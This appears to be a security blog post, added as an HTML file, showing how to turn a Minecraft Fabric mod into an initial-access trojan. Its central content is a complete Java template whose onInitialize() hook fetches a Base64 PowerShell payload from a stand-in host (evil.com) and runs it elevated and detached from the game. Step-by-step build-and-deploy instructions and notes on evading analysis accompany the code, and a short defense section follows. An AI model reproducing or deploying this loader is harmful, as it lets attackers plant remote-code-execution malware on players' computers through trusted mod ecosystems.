@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Minecraft Mods as Initial Access Vectors - GhostFlagged Blog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile-section">
+        <div class="profile-pic">
+          <img src="../033c6a1e8ca3ad18b0e6ac169604c66b.jpg" alt="Profile Picture" id="profile-img">
+        </div>
+        <h1>GhostFlagged</h1>
+        <p class="tagline">My personal space for writing and sharing ideas.</p>
+      </div>
+      
+      <div class="bio-section">
+        <h3>Bio</h3>
+        <p>Security researcher and CTF enthusiast. Passionate about web application security, vulnerability research, and sharing knowledge through writeups and tools.</p>
+      </div>
+      
+      <div class="contact-section">
+        <h3>Contact</h3>
+        <a href="mailto:your.email@example.com" class="email-link">your.email@example.com</a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a href="../index.html#posts" class="nav-link">Posts</a>
+      </nav>
+
+      <footer class="sidebar-footer">
+        <p>&copy; 2025 GhostFlagged</p>
+      </footer>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <article class="post-content">
+        <a href="../index.html" class="back-link">← Back to Home</a>
+        <div class="post-title-header">
+          <span class="post-category category-posts">Posts</span>
+          <h1>Minecraft Mods as Initial Access Vectors</h1>
+        </div>
+        <p class="post-meta">Published on January 2025</p>
+        <div class="post-body">
+          <p><strong>Disclaimer:</strong> This post is for educational and security research purposes only. Understanding these techniques helps security professionals defend against such attacks. Never use these techniques maliciously.</p>
+
+          <p>We know the gaming community doesn't always prioritize cybersecurity and information security. Minecraft has one of the largest modding communities, and in this post, we'll focus on how malicious actors could turn Minecraft mods into an initial access method.</p>
+
+          <h2>How to Do It</h2>
+          
+          <p>First, we need to choose a mod loader. We have two main options: <strong>Forge</strong> or <strong>Fabric</strong>. In this post, we'll focus primarily on the Fabric loader (I may edit this later to add Forge as well).</p>
+
+          <h3>Step 1: Get the Mod Template</h3>
+          
+          <p>We want to get the mod template from the <a href="https://fabricmc.net/develop/template/" target="_blank" rel="noopener">Fabric template generator</a>, or we can use the CLI tool. We'll use the Fabric CLI here:</p>
+
+          <pre class="code-block"><code>fabric init MyCoolMod -y</code></pre>
+
+          <h3>Step 2: Modify the Mod for Reverse Shell</h3>
+          
+          <p>We need to make a small change to make it function as a reverse shell. We need to edit the main function of the mod:</p>
+
+          <ol>
+            <li>Download it and open it in an editor</li>
+            <li>Open the following directory: <code>src/main/java/com/example/TemplateMod.java</code></li>
+          </ol>
+
+          <h3>Step 3: Understanding the onInitialize() Function</h3>
+          
+          <p>The most important function for us is <code>onInitialize()</code>. It loads during the startup stage of Minecraft, making it a good place to inject malicious code.</p>
+
+          <p><strong>Important note:</strong> There's a catch in this part—you need to create the PowerShell process using <code>Start-Process</code>. Otherwise, it won't work. This is because, if you simply open it normally, it runs under the parent process, which gets killed. As a result, we lose the shell.</p>
+
+          <h3>Step 4: Create the Connection Code</h3>
+          
+          <p>Now we need to create the code for the connection. Here's the complete modified template:</p>
+
+          <pre class="code-block"><code>package com.example;
+
+import net.fabricmc.api.ModInitializer;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
+
+public class TemplateMod implements ModInitializer {
+    public static final String MOD_ID = "template-mod";
+    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
+
+    @Override
+    public void onInitialize() {
+        LOGGER.info("TemplateMod initializing...");
+
+        String os = System.getProperty("os.name").toLowerCase();
+
+        if (!os.contains("win")) {
+            LOGGER.warn("Non-Windows OS detected. Skipping PowerShell payload.");
+            return;
+        }
+
+        try {
+            LOGGER.info("Fetching remote Base64 PowerShell payload...");
+
+            // Step 1: Download Base64-encoded PowerShell payload
+            URL url = new URL("https://evil.com/script.ps1");  // 🔁 Replace with your actual URL
+            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
+            StringBuilder encodedBuilder = new StringBuilder();
+
+            String line;
+            while ((line = reader.readLine()) != null) {
+                encodedBuilder.append(line.trim());
+            }
+            reader.close();
+
+            String encodedPayload = encodedBuilder.toString();
+            LOGGER.info("Payload downloaded, launching...");
+
+            // Step 2: Run via PowerShell (elevated, hidden)
+            String command = String.format(
+                "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand %s' -Verb RunAs",
+                encodedPayload
+            );
+
+            ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-Command", command);
+            builder.redirectErrorStream(true);
+            Process process = builder.start();
+
+            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            while ((line = outputReader.readLine()) != null) {
+                LOGGER.info("Output: {}", line);
+            }
+
+            int exitCode = process.waitFor();
+            LOGGER.info("PowerShell process exited with code {}", exitCode);
+
+        } catch (Exception e) {
+            LOGGER.error("Failed to run remote PowerShell payload", e);
+        }
+    }
+}</code></pre>
+
+          <h3>Step 5: Build and Deploy</h3>
+          
+          <p>Now just put it inside the mod folder and you'll see the execution. The mod will:</p>
+
+          <ol>
+            <li>Check if the system is Windows</li>
+            <li>Download a Base64-encoded PowerShell payload from a remote URL</li>
+            <li>Execute it using <code>Start-Process</code> with elevated privileges</li>
+            <li>Run the payload in a hidden PowerShell process</li>
+          </ol>
+
+          <h2>Proof of Concept</h2>
+          
+          <p>The following video demonstrates the attack in action:</p>
+
+          <div class="video-container">
+            <video controls preload="metadata">
+              <source src="../poc/minecraft-mod-poc.mp4" type="video/mp4">
+              Your browser does not support the video tag.
+            </video>
+          </div>
+
+          <h2>How This Works</h2>
+          
+          <ul>
+            <li><strong>Mod Loading:</strong> When Minecraft starts, it loads all mods in the mods folder</li>
+            <li><strong>onInitialize() Hook:</strong> This function is called automatically when the mod loads</li>
+            <li><strong>OS Detection:</strong> The code checks for Windows before attempting to run PowerShell</li>
+            <li><strong>Remote Payload:</strong> Downloads the actual payload from a remote server to avoid detection</li>
+            <li><strong>Process Isolation:</strong> Uses <code>Start-Process</code> to run in a separate process that won't be killed when Minecraft closes</li>
+            <li><strong>Elevated Execution:</strong> Uses <code>-Verb RunAs</code> to request administrator privileges</li>
+          </ul>
+
+          <h2>Defense Recommendations</h2>
+          
+          <p>For users and security professionals:</p>
+
+          <ul>
+            <li><strong>Verify Mod Sources:</strong> Only download mods from trusted sources (CurseForge, Modrinth, official repositories)</li>
+            <li><strong>Code Review:</strong> Review mod source code before installing, especially for mods from unknown developers</li>
+            <li><strong>Network Monitoring:</strong> Monitor outbound connections from gaming applications</li>
+            <li><strong>Application Whitelisting:</strong> Use application control policies to prevent unauthorized PowerShell execution</li>
+            <li><strong>User Education:</strong> Educate users about the risks of downloading mods from untrusted sources</li>
+            <li><strong>Sandboxing:</strong> Consider running games in sandboxed environments when possible</li>
+          </ul>
+
+          <h2>Key Takeaways</h2>
+          
+          <ul>
+            <li><strong>Trust in Modding Communities:</strong> The gaming community's trust in mods can be exploited by attackers</li>
+            <li><strong>Code Execution at Startup:</strong> Mod loaders provide automatic code execution hooks that can be abused</li>
+            <li><strong>Process Isolation is Critical:</strong> Using <code>Start-Process</code> ensures the payload survives even if the game closes</li>
+            <li><strong>Remote Payloads:</strong> Downloading payloads remotely makes static analysis more difficult</li>
+            <li><strong>Platform-Specific Attacks:</strong> The code targets Windows specifically, but similar techniques could work on other platforms</li>
+          </ul>
+
+          <p><em>This technique demonstrates why it's important for security researchers to understand how attackers might abuse legitimate software ecosystems. Always use this knowledge responsibly and ethically.</em></p>
+        </div>
+      </article>
+    </main>
+  </div>
+</body>
+</html>
+
